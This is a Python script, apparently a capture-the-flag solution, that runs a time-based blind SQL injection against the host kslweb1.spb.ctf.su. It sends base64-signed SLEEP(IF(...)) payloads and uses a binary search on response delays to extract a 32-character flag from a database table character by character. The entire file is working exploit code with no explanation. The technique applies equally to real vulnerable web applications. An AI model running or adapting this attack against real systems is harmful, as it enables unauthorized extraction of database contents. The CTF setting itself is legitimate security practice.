from http.client import HTTPConnection
from base64 import b64encode
import urllib
import time


SLEEP = 1
c = HTTPConnection("kslweb1.spb.ctf.su")
url = '/sqli/time1/?{}'


def binary_search(i):
    left = ord(' ') - 1
    right = ord('~');
    while left < right:
        middle = (left + right) // 2
        query = 'SLEEP(IF((SELECT ASCII(SUBSTRING((SELECT flag FROM flag), {}, 1))) <= {}, 0, {}))'.format(i, middle, SLEEP)
        # print(query)
    
        sig = b64encode(query.encode('UTF-8')).decode('UTF-8')
        params = {'query': query, 'sig_query': sig}
    
        query_time = time.time()
        c.request('GET', url.format(urllib.parse.urlencode(params)))
        response = c.getresponse().read()
        # print(decode('utf-8'))
        query_time = time.time() - query_time
        # print(query_time)
        
        if query_time < 1:
            right = middle
        else:
            left = middle + 1

    return chr(left)


_flag = ''
for _i in range(1, 33):
    _flag += binary_search(_i)
    print(_flag)

print('FINISH: ' + _flag)
